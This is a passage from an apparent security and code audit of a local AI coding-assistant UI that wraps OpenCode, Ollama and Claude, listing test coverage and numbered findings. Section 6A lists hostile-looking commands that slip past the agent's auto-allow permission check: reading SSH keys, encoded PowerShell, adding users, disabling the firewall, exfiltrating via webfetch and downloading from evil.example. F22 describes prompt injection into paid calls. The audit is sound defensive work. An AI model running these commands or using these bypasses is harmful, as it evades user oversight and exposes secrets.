Mocks (via `context.route`): OpenCode 4096: `GET /global/health, /path, /project/current, /permission, /question, /session/status, /session/ses_test/diff`; `POST /project/git/init, /session, /session/ses_test/prompt_async, /permission/:id/reply`; `GET /event` SSE held until events are queued, then answered once with `retry: 100` + events (the app reconnects). Companion 4097: `GET /health, /skills, /chats, /repos, /claude/usage, /fs` (with and without `files=1`); `POST /chats, /git/prepare`. Ollama 11434: `GET /api/ps` → `{models: []}`. Everything else leaving the dev server is blocked and recorded; unmocked calls get 404 (`POST /api/generate` preload is one — printed as a note).
The 8 steps:
- a. app loads, start text visible, git hint shows, sidebar says "bereit", click "Sicherung einschalten" → `POST /git/prepare {path:"C:\demo"}` before `POST /project/git/init`, hint disappears, note "Sicherung ist an".
- b. "+" → "Datei anhängen" → file picker asks `GET /fs?files=1`, open `C:\demo`, tick `notiz.txt`, "1 ausgewählt", confirm → exactly one attachment chip.
- c. send "Lege rechner.py an" → `prompt_async` body has 2 parts (text + file `file:///C:/demo/notiz.txt`, `text/plain`), `agent: build`, `providerID: ollama`, `variant: "ohne-denken"`; chip gone; stop button visible.
- d. risky command `Remove-Item -Recurse build` is **not** auto-allowed: card visible with the command, no reply within 700 ms, "Einmal erlauben" → `POST …/per_risky/reply {"reply":"once"}`.
- e. harmless `python -c "print(1+1)"` is auto-answered `{"reply":"once"}`; card removed; card lingered ≤300 ms in the DOM.
- f. answer streams ("Ich habe rechner.py angelegt."), stop button still there; finish events → "1 Datei geändert" with "+1", diff requested for `msg_user1`, context gauge visible, send button back; "Ansehen" opens diff modal with the patch; Escape closes it.
- g. Einstellungen opens; `think-off` is one `<select>` with options `schnell`/`gruendlich`, value `schnell`; `claude-spent` shows "0.00 $"; Escape closes.
- h. safety net: no request escaped the mocks, no uncaught page error.

### 5.3 Important behaviours with NO test
- `autoDecision` for non-bash types (edit/webfetch/websearch/task/unknown → `once`), `..`/relative/`$env:` paths, `.exe`/flag-prefixed interpreters, `git --no-pager`/`git.exe`, URL false positives, `npm run format` false alarm, drive-root workdir, `whyAsked` RISKY and fallback branches, `splitCommand` directly (unbalanced quotes → `null`, `if ($?)` wrapper only indirectly).
- All components except `FilePicker`: `RequestCard` (PermissionBox, QuestionBox, loop buttons), `Modi`, `SettingsPanel` (only `skillNameFrom`), `FolderPicker`, `UsageOverview`.
- Store behaviour of `useChats` (refresh/save/rename/remove, optimistic updates, error paths), `useSkills.refresh` (array guard, timeout), `useProjects`; `companionPost` error mapping; `listDir` network/HTML error handling.
- `claudeAudit`/`claudeOffload` request body (system/prompt/model/capUsd), `OFFLOAD_PREFIX`/`AUDIT_SYSTEM` wording, `postProcessClaude` flow (stop/sim guards, cap error surfacing), prompt prefix order in `App.send`.
- Settings persistence/migration (`thinkMode`, `keepWarmMin` defaults for old saves), `toggle`, `set`.
- `addLocal` when a turn has usage but zero output; `UsageOverview`/`UsageReadout` rendering.
- `ollama.ts` besides `loadPct`: `preload` error on non-OK, `keepWarm`, `recordLoadMs/estLoadMs`.
- E2E does not exercise: Modi switches, autoAllow OFF, question card, doom_loop card, Offload/Audit, key/test button/cap, FolderPicker, skills upload, history reopen/rename/delete, plan mode, undo, stop button action, project clone/git.

---------------------------------------------------------------------------------------------------

## 6. Findings

Legend: **sicher** = verified (run or unambiguous code); **Verdacht** = plausible, not proven. Decisions below were produced by running the real `autoDecision()`; "reaches the UI" depends on `config/opencode.json` (outside my files).

### 6A. Auto-allow: commands wrongly auto-allowed (`once`) — all decision results sicher
- **F1 `..` not resolved** — `requests.ts:36-37`, `:49-52`. `Get-Content C:\Users\Shadow\code\demo\..\..\..\.ssh\id_rsa` → `once`: the path "starts with" the working folder. sicher.
- **F2 relative and variable paths invisible** — `requests.ts:40` only knows `X:\`, `\\`, `~\`. `Get-Content ..\..\.ssh\id_rsa`, `echo hi > ..\..\x.txt`, `type $env:USERPROFILE\.ssh\id_rsa`, `Get-Content $HOME\.ssh\id_rsa`, `Set-Content -Path "$env:APPDATA\x.txt" -Value 1`, `cd ..; cd ..; Get-ChildItem` → all `once`. sicher (decision). Some of these never reach the UI because `config/opencode.json` allows `Get-Content*`/`echo *`; whether OpenCode's own external-directory check catches redirects/`cd ..` I could not verify (from memory only: Verdacht).
- **F3 interpreter only recognised right after the program name** — `requests.ts:33`, `:71-72`. `& "C:\Program Files\Python312\python.exe" -c "import os; os.remove('x.py')"`, `python.exe -c "import shutil; shutil.rmtree('src')"`, `python -u -c "…os.remove…"`, `py -3 -c "…"`, `node --no-warnings -e "require('fs').rmSync('x')"` → all `once`. sicher. The `.exe`/`&"…"` forms do reach the UI (they do not match OpenCode's `python *`), and the test file itself shows the model uses that form (`requests.test.ts:136`). `python -u -c`/`py -3 -c`/`node --x -e` match the `python *`/`py *`/`node *` allow rules in `config/opencode.json` (the `python -c*` ask rules only match when `-c` is first), so they may never reach the UI at all (Verdacht, config outside my area).
- **F4 PowerShell flag must be adjacent** — `requests.ts:33`. `powershell -NoProfile -EncodedCommand ZQBj…`, `powershell -NoProfile -c "[IO.File]::Delete('a.txt')"`, `powershell -NoProfile -Command "[IO.Directory]::Delete('src',$true)"`, `Start-Process powershell -ArgumentList "-NoProfile","-EncodedCommand",…` → `once`. sicher.
- **F5 git variants** — `requests.ts:29`. `git --no-pager push origin main`, `git.exe push origin main`, `& "C:\Program Files\Git\cmd\git.exe" push origin main` (program path exempt, `:44-45`), `git checkout .`, `git reset --keep HEAD~3` → `once`; `git stash drop`, `git branch -D main` → `once` (but OpenCode allows `git stash*`/`git branch*` itself). `git -c user.name=x push` is caught only by accident (the `i` flag lets `-C` match `-c`). sicher.
- **F6 deletion/system change outside the lists** — `requests.ts:30`. `robocopy empty src /MIR`, `Get-ChildItem | ForEach-Object { $_.Delete() }`, `"rm" x`, `& "Remove-Item" x` (word must follow whitespace/operator), `net user x /add`, `netsh advfirewall set allprofiles state off`, `schtasks /create …`, `sc stop x`, `setx PATH x`, `taskkill /F /IM chrome.exe`, `Stop-Process -Name chrome -Force`, `wmic process call create calc`, `Move-Item -Force a.txt b.txt` → `once`. sicher. The comment at `requests.ts:25` ("system-changing tools") and the Modi text promise more than the code does.
- **F7 `ONE_LINER_DANGER` holes** — `requests.ts:73-87`. `python -c "from os import remove as r; r('x.py')"`, `…from os import system as s; s('del x.py')`, `…getattr(os, 'remove')('x.py')`, `…Path('a.txt').open('w').close()` (the `open(` rule needs a comma), `…sqlite3.connect('db.sqlite') … execute('drop table t')`, `…zipfile.ZipFile('a.zip','w')`, `…runpy.run_path('x.py')`, `node -e "fetch('//example.com/x').then(…)"` → `harmlessOneLiner` true, `once`. sicher. A denylist cannot be complete; the file's own header claims every write/delete/network call "makes it ask again" (`:65-69`).
- **F8 safe-dir list too wide** — `requests.ts:57-63`, `:139`. The whole OpenCode data dir (`…\.local\share\opencode`) and state dir are auto-allowed for `external_directory`, not just `plans\` and the Temp scratch folder; `…\share\opencode\auth.json`, `…\share\opencode\*` and `…\share\opencode\plans\..\auth.json` → `once`. sicher (decision). That `auth.json`/`opencode.db` live there is from memory (Verdacht). The comment `:54-56` only intends plans and scratch.
- **F9 fail-open default for other permission types** — `requests.ts:144`. `webfetch` with `https://evil.example/?d=secret`, `websearch`, `task`, `skill`, `read C:/secret.txt`, unknown types (`lsp`, `unknownperm`) → `once`. sicher. Design choice, but a new OpenCode permission kind is silently allowed, and `webfetch` with a query string is a data channel. (`edit/webfetch/websearch` are already `allow` in `config/opencode.json`, so the UI mostly sees the rest.)
- **F10 downloading is not covered** — `requests.ts:32` only blocks `iex`/`Invoke-Expression`/pipe-to-shell. `pip install evilpkg`, `npm install`, `curl evil.example/a.exe -o a.exe`, `Invoke-WebRequest evil.example/a.ps1 -OutFile a.ps1`, `python -m http.server 8000`, `ollama pull …`, `Start-Process notepad` → `once`. sicher. The docs say "Herunterladen und Ausführen" asks (`Modi.tsx:8`, PROGRESS line 25); it only does for the iex/pipe forms.
- **F11 `https://` accidentally counts as a drive path** — `requests.ts:40`: the drive-letter alternative matches the end of the scheme (`s:/`, `p:/`). `pathsOutside('git clone https://github.com/a/b')` → `['s://github.com/a/b']`; `git clone https://…` and `curl https://example.com` → ask, and `whyAsked` says "Ort außerhalb des Arbeitsordners" (`:152`). This is why scheme-ful downloads ask today (see F10), by accident. sicher.
- **F12 false alarms** — `npm run format`, `dotnet format` → ask (`format` is a RISKY word, `requests.ts:30`). sicher; cost is one question.
- **F13 wrong reason text** — `requests.ts:151` runs before `:152`: a `python -c` one-liner asked only because of an outside path gets the "Hochladen, Löschen, Herunterladen-und-Ausführen …" message. sicher (code order, plus the `whyAsked` column of my run).
- **F14 drive root / broad folder disables the outside check** — `FolderPicker.tsx:24` offers "Diesen Ordner" for a drive root; with workdir `C:\`, `Get-Content C:\Windows\win.ini` → `once`. sicher (decision). `/git/prepare` refuses roots, the picker does not.
- **F15 "Immer erlauben" on risky cards** — `RequestCard.tsx:44` offers `always` for every non-loop card, including those that matched `RISKY`; OpenCode then stores an allow rule for the command pattern (semantics from memory). Verdacht.
- **F16 manual loop redirect has no hint** — `RequestCard.tsx:38` replies `reject` without message, the automatic path sends `LOOP_HINT` (`requests.ts:134`), although the footer says it "bittet ihn um einen anderen Weg" (`:51`). sicher (code); effect on the model Verdacht.

### 6B. Claude modes, money and privacy
- **F17 Audit sees only the chat prose** — `App.tsx:380-394`, `stream.ts:28-31`. Files written by tools are not in `t.text` (PROGRESS: tool arguments are not streamed as text), so `AUDIT_SYSTEM` (`claude.ts:14-19`, "ist es lauffähig?") reviews e.g. "Ich habe rechner.py angelegt." Code path sicher; usefulness Verdacht (mode never run for real per PROGRESS).
- **F18 privacy sentence wrong for Audit** — `Modi.tsx:48` ("Claude erhält dabei nur in sich geschlossene, unbedenkliche Teile, nie deinen ganzen Zusammenhang") but Audit sends the whole final answer of every turn (`App.tsx:391-394`). sicher.
- **F19 paid calls for stopped and simulated turns** — `App.tsx:290` has no `run.stopped` / `run.sim` guard (`:404` sets `done` on Stop; `:269-270` skips usage for `sim`). A user-aborted partial answer, or the offline demo text when only the companion is up, is sent to Claude. sicher (code).
- **F20 offload result never reaches the model** — `App.tsx:381-389` only adds a bubble (`finishClaude`); no follow-up `sendPrompt`. `Modi.tsx:18` says it "holt das Ergebnis zurück" and the placeholder says "Ergebnis folgt unten". The next local turn does not know the result. sicher (code).
- **F21 Offload prefix and calls even without key; hint says otherwise** — `App.tsx:348` and `:290` do not check `modes.apiKey`; the hint at `:531-533` says "Bis dahin passiert nichts Zusätzliches". With Offload on and no key: the local model still gets the rule, and a block produces an error bubble from the companion. Also the hint tests the localStorage copy, not the companion's file. sicher (code).
- **F22 prompt injection / echo into paid calls** — `claude.ts:50-56`: any `<<<CLAUDE…>>>` in the model's final text is sent to Anthropic, so injected file content could push text out and cost money (bounded by the cap). `OFFLOAD_PREFIX` itself contains the literal token pair "<<<CLAUDE und >>>" (`claude.ts:10`); if the model repeats that rule, the regex yields the task "und". Verdacht.
- **F23 cap weaknesses** — empty/invalid number field → `Number('') || 0` → **0 = no cap** (`SettingsPanel.tsx:156`) sicher; cap is checked before the call so one call can overshoot, and `capUsd` is whatever the client sends, default 0 if omitted (`server.mjs:388`) sicher; unknown model priced as Opus (conservative) fine.
- **F24 API key stored in plaintext in localStorage** — `settings.ts:56` + `:80` (no `partialize`); also in the companion file. sicher.
- **F25 "Speichern" / "Verbindung testen" can erase the stored key and instructions** — they POST the localStorage values (`SettingsPanel.tsx:161,166`); the companion deletes the key file for an empty key (`server.mjs:70-74`) and removes the AGENTS.md block for empty instructions (`:61`). If localStorage was cleared (new Chrome profile) and the user presses the test button, the working key is gone. Code path sicher; trigger Verdacht.
- **F26 global instructions applied twice, saved indirectly** — prompt prefix (`App.tsx:349-350`) plus AGENTS.md block after the Claude "Speichern"; no save button in their own section (`SettingsPanel.tsx:105-109`). Verdacht (design/UX, doubles tokens per message).

### 6C. UI bugs / robustness
- **F27 real error text thrown away** — `SettingsPanel.tsx:46,59,70,89` map every exception to `OFFLINE_HINT` ("Der lokale Dienst läuft noch nicht …") although `companionPost` carries the companion's message (`companion.ts:20`): bad model name, non-GitHub URL, git failure, … all look like "service offline". sicher.
- **F28 premature success marks** — `run()` prints `✓ OpenDante aktualisiert — bitte neu starten` as soon as the POST returns (`SettingsPanel.tsx:46,251`), though the update only started (and `started:false` on non-Windows, `server.mjs:177`). sicher.
- **F29 `skillNameFrom` takes `name:` from the body** — `SettingsPanel.tsx:12`: lazy `[\s\S]*?` runs past the front-matter. Test: head without name + body line `name: ersetzt-alles` → name "ersetzt-alles". Same regex in `server.mjs:92`. sicher.
- **F30 FolderPicker race** — `FolderPicker.tsx:13-16` lacks the `latest` guard that `FilePicker.tsx:15-24` has; fast clicks can show an older listing. Verdacht.
- **F31 `listDir` error text** — `fs.ts:13-15`: a rejected fetch ("Failed to fetch") or HTML from an old companion (JSON parse error) is shown raw in the picker; the friendly text only appears for a JSON body without `dirs`. sicher (code).
- **F32 chat rename/delete failures** — `chats.ts:83-92`: rename keeps the optimistic title if the POST fails and throws into `void chats.rename(...)` (`ChatSidebar.tsx:42`); delete swallows errors so the chat reappears at the next refresh. Verdacht.
- **F33 attachment limits** — `attachments.ts:11` warns only above 1 MiB, but the model context is 65,536 tokens (`config/opencode.json`); a ~250 KB text already fills it. Every non-image/pdf extension is sent as `text/plain` (`:14-23`), so zip/docx/exe become garbage context. Verdacht.
- **F34 savings estimate inflated** — `usage.ts:36,71`: `localIn` adds the full re-read context at every step incl. cache hits, and `savedTokens = localIn + local`; a Claude bill with caching would be much lower. Labelled "Schätzung" in the UI. `addLocal` also drops `localIn` for a turn that generated 0 tokens (`usage.ts:35`). sicher (code), meaning Verdacht.
- **F35 keep-warm label** — option `0` is labelled "5 Minuten (Ollama-Standard)" (`SettingsPanel.tsx:121`), but `install.ps1:108` sets `OLLAMA_KEEP_ALIVE=60m`; `preload` sends `5m` for 0 (`ollama.ts:33`) while `keepWarm` does nothing for 0 (`:17`). Verdacht (inconsistent, low impact).
- **F36 slash commands unreachable** — `config/commands/{commit,review,test}.md` exist, but the web UI has no call to OpenCode's command endpoint (grep: none) and `expandSkillCommand` handles skills only; `/test` is sent as plain text. Verdacht (PROGRESS line 27 already lists `/test` as unproven).

### 6D. Dead code / stale text / contradictions with PROGRESS.md
- Dead: `companionHealth` (`companion.ts:8-10`); `ClaudeReply.costUsd/todayUsd` never read (`claude.ts:26`); `eta.ts` exports `elapsedMs, elapsedLabel, tokensPerSec, estimateTotalMs, remainingMs, fraction, remainingLabel` + types `AnswerSample/Timing` are used only by `eta.test.ts` (only `clock` and `median` are used, by `Clock.tsx` and `progress.ts`); `turnTokens`/`splitCommand` exported without outside user; "Connectoren" is a disabled placeholder (`SettingsPanel.tsx:215-217`); `baseName` re-export `FolderPicker.tsx:76`. sicher.
- Stale comments/UI text: `settings.ts:5` ("off by default" — `autoAllow` is true); `settings.ts:13` ("Opus 5.5 is the strongest/default" vs default Sonnet `:57`); `Modi.tsx:35` ("Alles ist standardmäßig aus") vs `autoAllow` true; `Modi.tsx:47` ("Beide Modi"); `claude.ts:3-5` ("only when Auto is on", "+ Automatic" — the Auto switch was removed); `SettingsPanel.tsx:17` ("auto/manual"); `Modi.tsx:23` says "vom stärksten Claude-Modell" while the model is the user's choice, default Sonnet. sicher.
- PROGRESS.md contradictions: "Status" says **98 Vitest (13 files)** — actual 129 in 17 (sicher). "`progress.ts` replaces the old `eta.ts`" — `eta.ts` still exists, is imported by `progress.ts:8` and `Clock.tsx:2` and has its own 10 tests (sicher). localStorage key list mentions `samples` (no such key in `web/src`; real keys: `openllm.modes`, `.companion`, `.base`, `.steps`, `.tasks`, `.loadms`, `.nogit.skip`) (sicher). Decisions line "Off by default (`settings.thinkOff`)" is superseded by `thinkMode` default `'schnell'` (`thinkOff` no longer exists; only the test id `think-off` remains) (sicher). "without key a yellow hint, no cost" is true for cost but not for "nothing additional" (F21). "download-and-run asks" see F10.

---------------------------------------------------------------------------------------------------

## localStorage keys (whole web/src, for reference)
`openllm.modes` (`settings.ts:80`, all settings incl. apiKey), `openllm.companion` (`companion.ts:6`), `openllm.base` (`api.ts:17`), `openllm.loadms` (`ollama.ts:41`), `openllm.steps`, `openllm.tasks`, `openllm.nogit.skip` (`storage.ts:2-4`). Files in my scope touch only `openllm.modes` and `openllm.companion`.

## HTTP endpoints called by files in scope (method path, file:line)
Companion `http://127.0.0.1:4097`: `GET /claude/usage` (SettingsPanel:38); `POST /settings` (SettingsPanel:161,166); `POST /claude/test` (SettingsPanel:167); `POST /skills` (SettingsPanel:84,245); `GET /skills` (skills:19); `POST /update/app` (SettingsPanel:251); `POST /update/models` (SettingsPanel:252); `GET /repos` (projects:19); `POST /repo/clone` (projects:33); `POST /git` (projects:37); `GET /chats` (chats:66); `POST /chats` (chats:74); `GET /chats/{id}` (chats:78); `POST /chats/rename` (chats:87); `POST /chats/delete` (chats:92); `POST /claude` (claude:30,33); `GET /fs` (fs:13); `GET /health` (companion:9, unused).
OpenCode `127.0.0.1:4096` (only built from my files): file parts for `POST /session/{id}/prompt_async` (attachments.ts → api.ts:41-44). Permission replies come from `App.tsx` via `RequestCard` callbacks.
